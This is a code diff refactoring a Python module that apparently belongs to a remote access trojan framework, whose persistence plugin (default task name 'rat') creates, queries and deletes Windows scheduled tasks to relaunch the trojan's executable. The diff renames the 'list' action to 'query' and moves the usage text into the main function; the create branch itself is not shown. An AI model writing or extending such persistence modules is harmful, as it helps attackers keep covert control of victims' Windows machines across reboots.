@@ -1,8 +1,3 @@
-# exec win/persist/schtasks.py --action create
-# exec win/persist/schtasks.py --action delete
-# exec win/persist/schtasks.py --action list --name MyTask
-# exec win/persist/schtasks.py --action list
-
 import subprocess
 
 from core.utils.client_util import get_executable_path
@@ -12,23 +7,31 @@ DEFAULT_NAME = 'rat'
 EXECUTABLE_PATH = get_executable_path()
 
 
-def schtasks(action='list', name=None):
-    """计划任务管理
+def schtasks(action, name):
+    if action == 'help':
+        print('\n' + '=' * 50)
+        print('Scheduled Task Persistence Script')
+        print('=' * 50)
+        print('\nUsage:')
+        print('  --action create               Create scheduled task (default name: rat)')
+        print('  --action delete               Delete scheduled task (default name: rat)')
+        print('  --action query                Check if task exists (default name: rat)')
+        print('  --action query --name MyTask  Check specific task')
+        print('  --action create --name MyTask Create with custom name')
+        print('  --action delete --name MyTask Delete with custom name')
+        print('\nExamples:')
+        print('  exec win/persist/schtasks.py --action create')
+        print('  exec win/persist/schtasks.py --action query --name MyTask')
+        print('  exec win/persist/schtasks.py --action delete --name MyTask')
+        print('=' * 50)
+        return
 
-    Args:
-        action: create - 创建, delete - 删除, list - 查看
-        name: 任务名称，默认 rat
-    """
-    if name is None:
-        name = DEFAULT_NAME
-
-    if action == 'list':
-        # 检查指定任务是否存在
+    if action == 'query':
         result = subprocess.run(f'schtasks.exe /query /tn "{name}"', shell=True, capture_output=True, text=True)
         if result.returncode == 0:
             print(f'✓ Scheduled task "{name}" exists')
-            # 显示任务详情
-            result = subprocess.run(f'schtasks.exe /query /tn "{name}" /fo LIST', shell=True, capture_output=True, text=True)
+            result = subprocess.run(f'schtasks.exe /query /tn "{name}" /fo LIST', shell=True, capture_output=True,
+                                    text=True)
             for line in result.stdout.splitlines():
                 if line.strip():
                     print(f'  {line.strip()}')
@@ -57,33 +60,8 @@ def schtasks(action='list', name=None):
         return
 
     print(f'Unknown action: {action}')
-    print_usage()
 
 
-def print_usage():
-    """打印使用说明"""
-    print('\n' + '=' * 50)
-    print('Scheduled Task Persistence Script')
-    print('=' * 50)
-    print('\nUsage:')
-    print('  --action create               Create scheduled task (default name: rat)')
-    print('  --action delete               Delete scheduled task (default name: rat)')
-    print('  --action list                 Check if task exists (default name: rat)')
-    print('  --action list --name MyTask   Check specific task')
-    print('  --action create --name MyTask Create with custom name')
-    print('  --action delete --name MyTask Delete with custom name')
-    print('\nExamples:')
-    print('  exec win/persist/schtasks.py --action create')
-    print('  exec win/persist/schtasks.py --action list --name MyTask')
-    print('  exec win/persist/schtasks.py --action delete --name MyTask')
-    print('=' * 50)
-
-
-# 从 kwargs 获取参数
-action = kwargs.get('action', 'list')
-name = kwargs.get('name', None)
-
-if action == 'help':
-    print_usage()
-else:
-    schtasks(action=action, name=name)
+action = kwargs.get('action', 'help')
+name = kwargs.get('name', DEFAULT_NAME)
+schtasks(action=action, name=name)
